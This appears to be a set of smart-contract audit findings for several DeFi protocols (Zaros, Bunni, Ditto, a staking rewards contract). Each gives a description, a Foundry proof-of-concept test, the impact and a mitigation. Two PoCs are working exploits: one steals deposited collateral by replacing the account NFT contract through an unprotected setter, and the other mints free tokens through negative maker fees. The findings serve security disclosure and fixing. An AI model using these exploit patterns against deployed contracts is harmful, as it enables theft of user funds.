Description:
GlobalConfigurationBranch.setTradingAccountToken
has
no access control
meaning an attacker could update the account nft token to an arbitrary address.
Impact:
An attacker can use a custom attack contract to steal user deposited collateral.
Proof of Concept:
Add the following code to new file
test/integration/perpetuals/trading-account-branch/depositMargin/stealMargin.t.sol
:
----new code block----
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.25;
​
// Zaros dependencies
import { Errors } from "@zaros/utils/Errors.sol";
import { Base_Test } from "test/Base.t.sol";
import { TradingAccountBranch } from "@zaros/perpetuals/branches/TradingAccountBranch.sol";
​
// @audit used for attack contract
import { ERC721, ERC721Enumerable } from "@openzeppelin/token/ERC721/extensions/ERC721Enumerable.sol";
import { IPerpsEngine } from "@zaros/perpetuals/PerpsEngine.sol";
​
contract AttackerAccountNFT is ERC721Enumerable {
 constructor() ERC721("", "") { }
​
 function stealAccount(address perpsEngineAddr, uint128 tokenId) external {
 // @audit mint attacker the requested tokenId
        _mint(msg.sender, tokenId);
​
 // @audit call perps engine to transfer account to attacker
        IPerpsEngine perpsEngine = IPerpsEngine(perpsEngineAddr);
        perpsEngine.notifyAccountTransfer(msg.sender, tokenId);
    }
}
​
contract StealMargin_Integration_Test is Base_Test {
 function setUp() public override {
        Base_Test.setUp();
    }
​
 function test_AttackerStealsUserCollateral() external {
 // @audit naruto the victim will create an account and deposit
 uint256 amountToDeposit = 10 ether;
        deal({ token: address(usdToken), to: users.naruto, give: amountToDeposit });
​
 uint128 victimTradingAccountId = perpsEngine.createTradingAccount();
​
 // it should emit {LogDepositMargin}
        vm.expectEmit({ emitter: address(perpsEngine) });
 emit TradingAccountBranch.LogDepositMargin(
            users.naruto, victimTradingAccountId, address(usdToken), amountToDeposit
        );
​
 // it should transfer the amount from the sender to the trading account
        expectCallToTransferFrom(usdToken, users.naruto, address(perpsEngine), amountToDeposit);
        perpsEngine.depositMargin(victimTradingAccountId, address(usdToken), amountToDeposit);
​
 uint256 newMarginCollateralBalance =
            perpsEngine.getAccountMarginCollateralBalance(victimTradingAccountId, address(usdToken)).intoUint256();
​
 // it should increase the amount of margin collateral
        assertEq(newMarginCollateralBalance, amountToDeposit, "depositMargin");
​
 // @audit sasuke the attacker will steal naruto's deposit
 // beginning state: theft has not occured
        assertEq(0, usdToken.balanceOf(users.sasuke));
 //
 // @audit 1) sasuke creates their own hacked `AccountNFT` contract
        vm.startPrank(users.sasuke);
        AttackerAccountNFT attackerNftContract = new AttackerAccountNFT();
​
 // @audit 2) sasuke uses lack of access control to make their
 // hacked `AccountNFT` contract the official contract
        perpsEngine.setTradingAccountToken(address(attackerNftContract));
​
 // @audit 3) sasuke calls the attack function in their hacked `AccountNFT`
 // contract to steal ownership of the victim's account
        attackerNftContract.stealAccount(address(perpsEngine), victimTradingAccountId);
​
 // @audit 4) sasuke withdraws the victim's collateral
        perpsEngine.withdrawMargin(victimTradingAccountId, address(usdToken), amountToDeposit);
        vm.stopPrank();
​
 // @audit end state: sasuke has stolen the victim's deposited collateral
        assertEq(amountToDeposit, usdToken.balanceOf(users.sasuke));
    }
}
----end of code block ----
Run with:
forge test --match-test test_AttackerStealsUserCollateral
Recommended Mitigation:
Add the
onlyOwner
modifier to
GlobalConfigurationBranch.setTradingAccountToken
.
Zaros:
Fixed in commit
819f624
.
Cyfrin:
Verified.

Description:
Attacker can perform a risk-free trade to mint free USDz tokens by opening then quickly closing positions in markets using negative
makerFee
; this is effectively a free mint exploit dressed up as a risk-free "trade".
Proof of Concept:
First change
script/markets/BtcUsd.sol
to have a negative
makerFee
like this:
----new code block----
-    OrderFees.Data internal btcUsdOrderFees = OrderFees.Data({ makerFee: 0.0004e18, takerFee: 0.0008e18 });
+    OrderFees.Data internal btcUsdOrderFees = OrderFees.Data({ makerFee: -0.0004e18, takerFee: 0.0008e18 });
----end of code block ----
Then add PoC to
test/integration/perpetuals/order-branch/createMarketOrder/createMarketOrder.t.sol
:
----new code block----
// new import at the top
import {console} from "forge-std/console.sol";
​
function test_AttackerMintsFreeUSDzOpenThenQuicklyClosePositionMarketNegMakerFee() external {
 // In a market with a negative maker fee, an attacker can perform
 // a risk-free "trade" by opening then quickly closing a position.
 // This allows attackers to mint free USDz without
 // any risk; it is essentially a free mint exploit dressed up
 // as a risk-free "trade"
​
 // give naruto some tokens
 uint256 USER_STARTING_BALANCE = 100_000e18;
 int128  USER_POS_SIZE_DELTA   = 10e18;
    deal({ token: address(usdToken), to: users.naruto, give: USER_STARTING_BALANCE });
​
 // naruto creates a trading account and deposits their tokens as collateral
    changePrank({ msgSender: users.naruto });
 uint128 tradingAccountId = createAccountAndDeposit(USER_STARTING_BALANCE, address(usdToken));
​
 // naruto opens position in BTC market
    openManualPosition(BTC_USD_MARKET_ID, BTC_USD_STREAM_ID, MOCK_BTC_USD_PRICE, tradingAccountId, USER_POS_SIZE_DELTA);
​
 // naruto closes position in BTC market immediately after
 // in practice this would occur one or more blocks after the
 // first order had been filled
    openManualPosition(BTC_USD_MARKET_ID, BTC_USD_STREAM_ID, MOCK_BTC_USD_PRICE, tradingAccountId, -USER_POS_SIZE_DELTA);
​
 // verify that now naruto has MORE USDz than they started with!
 uint256 traderCollateralBalance = perpsEngine.getAccountMarginCollateralBalance(tradingAccountId, address(usdToken)).intoUint256();
 assert(traderCollateralBalance > USER_STARTING_BALANCE);
​
 // naruto now withdraws all their collateral
    perpsEngine.withdrawMargin(tradingAccountId, address(usdToken), traderCollateralBalance);
​
 // verify that naruto has withdrawn more USDz than they deposited
 uint256 traderFinalUsdzBalance = usdToken.balanceOf(users.naruto);
 assert(traderFinalUsdzBalance > USER_STARTING_BALANCE);
​
 // output the profit
    console.log("Start USDz  : %s", USER_STARTING_BALANCE);
    console.log("Final USDz  : %s", traderFinalUsdzBalance);
    console.log("USDz profit : %s", traderFinalUsdzBalance - USER_STARTING_BALANCE);
​
 // profit = 796 040000000000000000
 //        = $796
}
----end of code block ----
Run with:
forge test --match-test test_AttackerMintsFreeUSDzOpenThenQuicklyClosePositionMarketNegMakerFee -vvv
Impact:
The attacker can effectively perform a risk-free or minimal-risk trade to harvest free tokens via the negative
marginFee
; in the PoC the attacker was able to profit $796.
One potential invalidation for this attack vector is that in the real system the protocol controls the keepers who fill orders so an attacker couldn't force both trades into the same block in practice.
The real-world flow would go like this:
Attacker creates market order to buy (block 1)
Keeper fills buy order (block 2)
Attacker creates market order to sell (block 3)
Keeper fills sell order (block 4)
So it couldn't be done in one block in practice which means the attacker would be exposed to market movements for a tiny amount of time and that it isn't flash loan exploitable.
But it still seems quite exploitable to mint free tokens with very little exposure to market movements especially as the attacker is able to harvest the maker fee on both transactions by exploiting these 2 Low findings:
PerpMarket::getOrderFeeUsd rewards traders who flip the skew with makerFee for the full trade
PerpMarket::getOrderFeeUsd incorrectly charges makerFee when skew is zero and trade is buy order
Recommended Mitigation:
Two possible options:
Don't allow negative
makerFee
/
takerFee
; change
leaves/OrderFees.sol
to use
uint128
.
If negative fees are desired implement a minimum time for which a position must remain open before it can be modified so that an attacker couldn't open a position then quickly close it to simply cash out the
makerFee
.
Zaros:
Fixed in commit
e03228e
by no longer supporting negative fees; both
makerFee
and
takerFee
are now unsigned.
Cyfrin:
Verified.

Description:
While both
BunniQuoter::quoteSwap
and
BunniHookLogic::beforeSwap
are intended to contain the same fee logic, there remain a couple of inconsistencies that appear to have either been missed or reintroduced as a regression.
Firstly,
BunniQuoter::quoteSwap
applies an additional adjustment to the swap fee when
useAmAmmFee
is enabled to add the hook fee, increasing the effective fee charged to the swapper:
----new code block----
swapFee += uint24(hookFeesBaseSwapFee.mulDivUp(hookFeeModifier, MODIFIER_BASE));
----end of code block ----
This adjustment is intended to account for the actual cost of the swap including the hook fee; however, in
BunniHookLogic::beforeSwap
, which performs the actual execution of the swap, this adjustment is not actually applied. The base fee is computed for use in subsequent event emission and passed to the
HookletLib::hookletAfterSwap
call without including the hook fee, resulting in an incorrect effective swap fee being used during execution.
Secondly, while
BunniQuoter::quoteSwap
intends to provide pricing and fee estimates for a simulated swap, it omits the application of a curator fee that is present and deducted alongside the protocol and am-AMM fees in the actual
BunniHookLogic::beforeSwap
logic:
----new code block----
curatorFeeAmount = baseSwapFeeAmount.mulDivUp(curatorFees.feeRate, CURATOR_FEE_BASE);
----end of code block ----
As such, this represents an additional inconsistency between these two implementations that results in the quote differing from the actual execution, in this case charging more than quoted. This portion of the discrepancy originates from the design of
BunniQuoter::quoteSwap
as a view function that does not have direct access to the
curatorFees
in
HookStorage
.
Impact:
Off-chain components relying on the
Swap
event may reference an incorrect value for the swap fee. Interfaces relying on
BunniQuoter::quoteSwap
to estimate the swap fees/output will underestimate the total fee and overestimate the user’s output. Hooklets relying on
swapFee
for accounting or additional fee calculations may charge an incorrect amount. When the hook fee modifier and curator fee rate are non-zero, the swap fee used in the actual deduction and emitted in events is smaller than that computed by the quote.
Proof of Concept:
The following fuzz test can be added to
BunniHook.t.sol
to assert equivalence, and demonstrates that this is not currently the case:
----new code block----
function test_fuzz_quoter_quoteSwap(
 uint256 swapAmount,
 bool zeroForOne,
 bool amAmmEnabled
) external {
    swapAmount = bound(swapAmount, 1e6, 1e36);
​
 // deploy mock hooklet with all flags
 bytes32 salt;
 unchecked {
 bytes memory creationCode = type(HookletMock).creationCode;
 for (uint256 offset; offset < 100000; offset++) {
            salt = bytes32(offset);
 address deployed = computeAddress(address(this), salt, creationCode);
 if (
 uint160(bytes20(deployed)) & HookletLib.ALL_FLAGS_MASK == HookletLib.ALL_FLAGS_MASK
 && deployed.code.length == 0
            ) {
 break;
            }
        }
    }
    HookletMock hooklet = new HookletMock{salt: salt}();
​
    ILiquidityDensityFunction ldf_ =
 new UniformDistribution(address(hub), address(bunniHook), address(quoter));
 bytes32 ldfParams = bytes32(abi.encodePacked(ShiftMode.STATIC, int24(-5) * TICK_SPACING, int24(5) * TICK_SPACING));
​
    (IBunniToken bunniToken, PoolKey memory key) = hub.deployBunniToken(
        IBunniHub.DeployBunniTokenParams({
            currency0: Currency.wrap(address(token0)),
            currency1: Currency.wrap(address(token1)),
            tickSpacing: TICK_SPACING,
            twapSecondsAgo: 0,
            liquidityDensityFunction: ldf_,
            hooklet: hooklet,
            ldfType: LDFType.STATIC,
            ldfParams: ldfParams,
            hooks: bunniHook,
            hookParams: abi.encodePacked(
                FEE_MIN,
                FEE_MAX,
                FEE_QUADRATIC_MULTIPLIER,
                FEE_TWAP_SECONDS_AGO,
                POOL_MAX_AMAMM_FEE,
                SURGE_HALFLIFE,
                SURGE_AUTOSTART_TIME,
                VAULT_SURGE_THRESHOLD_0,
                VAULT_SURGE_THRESHOLD_1,
                REBALANCE_THRESHOLD,
                REBALANCE_MAX_SLIPPAGE,
                REBALANCE_TWAP_SECONDS_AGO,
                REBALANCE_ORDER_TTL,
                amAmmEnabled,
                ORACLE_MIN_INTERVAL,
 uint48(1)
            ),
            vault0: ERC4626(address(0)),
            vault1: ERC4626(address(0)),
            minRawTokenRatio0: 0.08e6,
            targetRawTokenRatio0: 0.1e6,
            maxRawTokenRatio0: 0.12e6,
            minRawTokenRatio1: 0.08e6,
            targetRawTokenRatio1: 0.1e6,
            maxRawTokenRatio1: 0.12e6,
            sqrtPriceX96: TickMath.getSqrtPriceAtTick(4),
            name: bytes32("BunniToken"),
            symbol: bytes32("BUNNI-LP"),
            owner: address(this),
            metadataURI: "metadataURI",
 salt: ""
        })
    );
​
 // make initial deposit to avoid accounting for MIN_INITIAL_SHARES
 uint256 depositAmount0 = PRECISION;
 uint256 depositAmount1 = PRECISION;
    vm.startPrank(address(0x6969));
    token0.approve(address(PERMIT2), type(uint256).max);
    token1.approve(address(PERMIT2), type(uint256).max);
    weth.approve(address(PERMIT2), type(uint256).max);
    PERMIT2.approve(address(token0), address(hub), type(uint160).max, type(uint48).max);
    PERMIT2.approve(address(token1), address(hub), type(uint160).max, type(uint48).max);
    PERMIT2.approve(address(weth), address(hub), type(uint160).max, type(uint48).max);
    vm.stopPrank();
​
    _makeDepositWithFee(key, depositAmount0, depositAmount1, address(0x6969), 0, 0, "");
​
    vm.prank(HOOK_FEE_RECIPIENT_CONTROLLER);
    bunniHook.setHookFeeRecipient(HOOK_FEE_RECIPIENT);
    bunniHook.setHookFeeModifier(HOOK_FEE_MODIFIER);
    bunniHook.curatorSetFeeRate(key.toId(), uint16(MAX_CURATOR_FEE));
​
 if (amAmmEnabled) {
        _makeDeposit(key, 1_000_000_000 * depositAmount0, 1_000_000_000 * depositAmount1, address(this), "");
​
        bunniToken.approve(address(bunniHook), type(uint256).max);
        bunniHook.bid({
            id: key.toId(),
            manager: address(this),
            payload: bytes6(bytes3(POOL_MAX_AMAMM_FEE)),
            rent: 1e18,
            deposit: uint128(K) * 1e18
        });
​
        skipBlocks(K);
​
        IAmAmm.Bid memory bid = bunniHook.getBid(key.toId(), true);
        assertEq(bid.manager, address(this), "manager incorrect");
    }
​
    (Currency inputToken, Currency outputToken) =
        zeroForOne ? (key.currency0, key.currency1) : (key.currency1, key.currency0);
    _mint(inputToken, address(this), swapAmount * 2);
    IPoolManager.SwapParams memory params = IPoolManager.SwapParams({
        zeroForOne: zeroForOne,
        amountSpecified: -int256(swapAmount),
        sqrtPriceLimitX96: zeroForOne ? TickMath.MIN_SQRT_PRICE + 1 : TickMath.MAX_SQRT_PRICE - 1
    });
​
 // quote swap
    (bool success,,, uint256 inputAmount, uint256 outputAmount, uint24 swapFee,) = quoter.quoteSwap(address(this), key, params);
    assertTrue(success, "quoteSwap failed");
​
 // execute swap
 uint256 actualInputAmount;
 uint256 actualOutputAmount;
    {
 uint256 beforeInputTokenBalance = inputToken.balanceOfSelf();
 uint256 beforeOutputTokenBalance = outputToken.balanceOfSelf();
        vm.recordLogs();
        swapper.swap(key, params, type(uint256).max, 0);
        actualInputAmount = beforeInputTokenBalance - inputToken.balanceOfSelf();
        actualOutputAmount = outputToken.balanceOfSelf() - beforeOutputTokenBalance;
    }
​
 // check if swapFee matches
    Vm.Log[] memory logs = vm.getRecordedLogs();
    Vm.Log memory swapLog;
 for (uint256 i = 0; i < logs.length; i++) {
 if (logs[i].emitter == address(bunniHook) && logs[i].topics[0] == keccak256("Swap(bytes32,address,bool,bool,uint256,uint256,uint160,int24,uint24,uint256)")) {
            swapLog = logs[i];
 break;
        }
    }
​
 // parse log and extract swapFee from calldata
    (,,,,,,uint24 fee,) = abi.decode(swapLog.data, (
 bool,
 bool,
 uint256,
 uint256,
 uint160,
 int24,
 uint24,
 uint256
    ));
​
    assertEq(swapFee, fee, "swapFee doesn't match quoted swapFee");
​
 // check if actual amounts match quoted amounts
    assertEq(actualInputAmount, inputAmount, "actual input amount doesn't match quoted input amount");
    assertEq(actualOutputAmount, outputAmount, "actual output amount doesn't match quoted output amount");
}
----end of code block ----
Recommended Mitigation:
Ensure that the hook fee modifier and curator fee logic is consistently applied across both
BunniQuoter::quoteSwap
and
BunniHookLogic::beforeSwap
. To do so, it may be necessary to expose a view function to query the curator fee rate per pool.
The
outputAmount
/
swapFeeAmount
adjustments are confusing because the logic is slightly inconsistent which makes them difficult to compare. If possible, consider pulling out this common shared logic into a separate library function to minimize the likelihood of introducing further inconsistencies.
Bacon Labs:
Fixed in commits
2a54265
and
99dd8d4
.
Cyfrin:
Verified. The quoter and hook implementations are now consistent.
\clearpage

Relevant GitHub Links
https://github.com/Cyfrin/2023-09-ditto/blob/main/contracts/libraries/LibOracle.sol#L87-L89
Summary & Vulnerability Details
The protocol expects to
revert
with
Errors.InvalidTwapPrice()
when
twapPriceInEther == 0
:
----new code block----
File: contracts/libraries/LibOracle.sol
​
85            uint256 twapPriceInEther = (twapPrice / Constants.DECIMAL_USDC) * 1 ether;
86            uint256 twapPriceInv = twapPriceInEther.inv();
87 if (twapPriceInEther == 0) {
88                revert Errors.InvalidTwapPrice(); // @audit : unreachable code
89            }
----end of code block ----
However, the control never reaches Line 88 when
twapPriceInEther
is zero. It rather reverts before that with error
Division or modulo by 0
. :br
NOTE:
Due to this bug,
Errors.InvalidTwapPrice()
is
never
invoked/thrown by the protocol even under satisfactory conditions, even though it has been defined.
PoC
Since I could not find any helper function inside
contracts/
or
test/
which lets one set the
twapPrice
returned by
uint256 twapPrice = IDiamond(payable(address(this))).estimateWETHInUSDC(Constants.UNISWAP_WETH_BASE_AMT, 30 minutes);
to zero for testing purposes, I have created a simplified PoC which targets the problem area::br
Save the following as a file named
test/InvalidTwapPriceErrorCheck.t.sol
and run the test via
forge test --mt testInvalidTwapPriceErrNeverInvoked -vv
. You will find that the test reverts with error
Division or modulo by 0
, but not with
Errors.InvalidTwapPrice()
. The PoC uses the same underlying math libraries and logic path as the protocol does in
contracts/libraries/LibOracle.sol::baseOracleCircuitBreaker()
.
----new code block----
// SPDX-License-Identifier: GPL-3.0-only
pragma solidity 0.8.21;
​
import {Constants} from "contracts/libraries/Constants.sol";
import {Errors} from "contracts/libraries/Errors.sol";
import {U256} from "contracts/libraries/PRBMathHelper.sol";
import {OBFixture} from "test/utils/OBFixture.sol";
​
contract InvalidTwapPriceErrorCheck is OBFixture {
 using U256 for uint256;
​
 function getZeroTwapPriceInEther_IncorrectStyle_As_In_Existing_DittoProtocol()
        internal
        pure
 returns (uint256 twapPriceInEther, uint256 twapPriceInv)
    {
 // fake the twapPrice to 0
        uint256 twapPrice = 0; // IDiamond(payable(address(this))).estimateWETHInUSDC(Constants.UNISWAP_WETH_BASE_AMT, 30 minutes);
 // Following code is copied as-is from
 // `contracts/libraries/LibOracle.sol::baseOracleCircuitBreaker()#L85-L89`
        twapPriceInEther = (twapPrice / Constants.DECIMAL_USDC) * 1 ether;
        twapPriceInv = twapPriceInEther.inv();
 if (twapPriceInEther == 0) {
            revert Errors.InvalidTwapPrice(); // @audit : unreachable code
        }
    }
​
 function getZeroTwapPriceInEther_CorrectStyle()
        internal
        pure
 returns (uint256 twapPriceInEther, uint256 twapPriceInv)
    {
 // fake the twapPrice to 0
        uint256 twapPrice = 0; // IDiamond(payable(address(this))).estimateWETHInUSDC(Constants.UNISWAP_WETH_BASE_AMT, 30 minutes);
        twapPriceInEther = (twapPrice / Constants.DECIMAL_USDC) * 1 ether;
 if (twapPriceInEther == 0) { 
            revert Errors.InvalidTwapPrice();
        }
        twapPriceInv = twapPriceInEther.inv();
    }
​
 function testInvalidTwapPriceErrNeverInvoked() public pure {
 getZeroTwapPriceInEther_IncorrectStyle_As_In_Existing_DittoProtocol();
    }
​
 function testInvalidTwapPriceErrInvokedCorrectly() public {
        vm.expectRevert(Errors.InvalidTwapPrice.selector);
 getZeroTwapPriceInEther_CorrectStyle();
    }
}
----end of code block ----
:br
In the above test file, you can also run the test which invokes the "fixed" or "correct" code style via
forge test --mt testInvalidTwapPriceErrInvokedCorrectly -vv
. This will invoke the
Errors.InvalidTwapPrice
error, as expected.
Recommendations & Root Cause
The check on Line 87 (
if
condition) needs to be performed immediately after Line 85.
----new code block----
    85            uint256 twapPriceInEther = (twapPrice / Constants.DECIMAL_USDC) * 1 ether;
+   86            if (twapPriceInEther == 0) {
+   87                revert Errors.InvalidTwapPrice();
+   88            }
+   89            uint256 twapPriceInv = twapPriceInEther.inv();
-   86            uint256 twapPriceInv = twapPriceInEther.inv();
-   87            if (twapPriceInEther == 0) {
-   88                revert Errors.InvalidTwapPrice();
-   89            }
----end of code block ----
The above fix needed to be done because the
inv()
call caused a revert even before control used to reach the
if
condition.
Impact
Protocol owner or developer monitoring for a revert due to
Errors.InvalidTwapPrice()
in the logs will never see it and will make debugging & issue resolution harder.
Tools Used
Manual audit & foundry.

Description:
The rewards calculation directly accesses the totalStakeCache mapping instead of using the getTotalStake() function with proper fallback logic:
----new code block----
function _calculateOperatorShare(uint48 epoch, address operator) internal {
 // code..
​
 uint96[] memory assetClasses = l1Middleware.getAssetClassIds();
 for (uint256 i = 0; i < assetClasses.length; i++) {
 uint256 totalStake = l1Middleware.totalStakeCache(epoch, assetClasses[i]); //@audit directly accesses totalStakeCache
  }
}
----end of code block ----
Only specific operations trigger caching for secondary asset classes:
----new code block----
// @audit following only cache PRIMARY_ASSET_CLASS (asset class 1)
addNode(...) updateStakeCache(getCurrentEpoch(), PRIMARY_ASSET_CLASS)
forceUpdateNodes(...) updateStakeCache(getCurrentEpoch(), PRIMARY_ASSET_CLASS)
​
// @audit only caches the specific asset class being slashed
slash(epoch, operator, amount, assetClassId) updateStakeCache(epoch, assetClassId)
----end of code block ----
Secondary asset classes (2, 3, etc.) are only cached when:
Slashing occurs for that specific asset class (infrequent)
Manual calcAndCacheStakes() calls (requires intervention)
As a result, when rewards distributor calls
distributeRewards
, for the specific asset class ID with uncached stake,
_calculateOperatorShare
leads to a division by zero error.
Impact:
Rewards distribution fails for affected epochs. It is worthwhile to note that DoS is temporary - manual intervention by calling
calcAndCacheStakes
for specific asset class ID's can fix the DoS error.
Proof of Concept:
Add the following test to
RewardsTest.t.sol
----new code block----
function test_RewardsDistributionDOS_With_UncachedSecondaryAssetClasses() public {
 uint48 epoch = 1;
 uint256 uptime = 4 hours;
​
 // Setup stakes for operators normally
    _setupStakes(epoch, uptime);
​
 // Set totalStakeCache to 0 for secondary asset classes to simulate uncached state
    middleware.setTotalStakeCache(epoch, 2, 0); // Secondary asset class 2
    middleware.setTotalStakeCache(epoch, 3, 0); // Secondary asset class 3
​
 // Keep primary asset class cached (this would be cached by addNode/forceUpdateNodes)
    middleware.setTotalStakeCache(epoch, 1, 100000); // This stays cached
​
​
 // Move to epoch where distribution is allowed (must be at least 2 epochs ahead)
    vm.warp((epoch + 3) * middleware.EPOCH_DURATION());
​
 // Attempt to distribute rewards - this should fail due to division by zero
 // when _calculateOperatorShare tries to calculate rewards for uncached secondary asset classes
    vm.expectRevert(); // This should revert due to division by zero in share calculation
​
    vm.prank(REWARDS_DISTRIBUTOR_ROLE);
    rewards.distributeRewards(epoch, 3);
}
​
----end of code block ----
Recommended Mitigation:
Consider checking and caching stake for assetIds if it doesn't exist.
----new code block----
function _calculateOperatorShare(uint48 epoch, address operator) internal {
 // code..
​
 uint96[] memory assetClasses = l1Middleware.getAssetClassIds();
 for (uint256 i = 0; i < assetClasses.length; i++) {
++ uint256 totalStake = l1Middleware.totalStakeCache(epoch, assetClasses[i]);
++ if (totalStake == 0) {
++            l1Middleware.calcAndCacheStakes(epoch, assetClasses[i]);
++             totalStake = l1Middleware.totalStakeCache(epoch, assetClasses[i]);
++       }
 // code
  }
}
----end of code block ----
